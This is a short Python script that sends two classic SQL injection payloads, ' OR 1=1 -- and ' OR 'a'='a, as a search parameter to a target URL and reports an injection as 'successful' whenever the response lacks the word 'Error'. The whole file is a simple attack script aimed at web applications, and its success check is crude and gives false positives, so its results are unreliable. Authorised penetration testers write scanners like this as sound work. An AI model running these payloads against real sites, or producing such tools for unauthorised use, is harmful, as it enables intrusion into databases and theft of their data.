#!/usr/bin/env python3

import requests

target_url = "http://example.com/search"
injection_payloads = ["' OR 1=1 --", "' OR 'a'='a"]  # Add desired injection payloads

def test_sql_injection(url, payload):
    params = {
        "search_term": payload
    }
    response = requests.get(url, params=params)
    if "Error" not in response.text:
        print(f"SQL Injection successful with payload: {payload}")

for payload in injection_payloads:
    test_sql_injection(target_url, payload)
